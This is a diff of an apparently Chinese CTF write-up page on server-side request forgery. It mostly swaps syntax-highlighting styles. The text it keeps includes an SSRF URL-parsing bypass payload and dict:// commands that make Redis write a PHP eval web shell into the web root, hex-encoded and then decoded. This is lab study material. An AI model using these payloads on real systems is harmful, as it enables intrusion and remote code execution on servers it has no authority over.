@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -273,7 +281,7 @@
 </li>
 <li><p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127。0。0。1</a>  &gt;&gt;&gt;  <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
 </li>
-<li><div class="hljs"><pre><code class="php">http://vps/ssrf.php
+<li><pre><code class="php">http://vps/ssrf.php
 ssrf.php里面的内容为：
 &lt;?php header(&#39;Location:127.0.0.1&#39;);?&gt;
 <pre><code class="hljs php">
@@ -288,7 +296,7 @@ $x=parse_url($url);
 &#125;
 
 
-payload:url=http:<span class="hljs-comment">//ctf.@127.0.0.1/flag.php?show</span></code></pre></div>
+payload:url=http:<span class="hljs-comment">//ctf.@127.0.0.1/flag.php?show</span></code></pre>
 ## web359
 hint:打无密码的mysql
 `./check.php`传参`seturl`
@@ -299,13 +307,13 @@ hint:打无密码的mysql
 <h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p>hint：<code>打redis</code><br>用<code>gopherus</code>打</p>
 <p>手打写shell</p>
 <p>payload：</p>
-<div class="hljs"><pre><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html
+<pre><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html
 
 dict://127.0.0.1:6379/config:set:shell:&quot;\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29\x3b\x3f\x3e&quot;
 
 dict://127.0.0.1:6379/config:set:dbfilename:1.php
 
-dict://127.0.0.1:6379/save</code></pre></div>
+dict://127.0.0.1:6379/save</code></pre>
 <p><code>\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29\x3b\x3f\x3e</code>—-&gt;<code>&lt;?php eval($_POST[1]);?&gt;</code></p>
 
             </div>
@@ -466,6 +474,8 @@ dict://127.0.0.1:6379/save</code></pre></div>
 
 
 
+  
+    
   
 
 
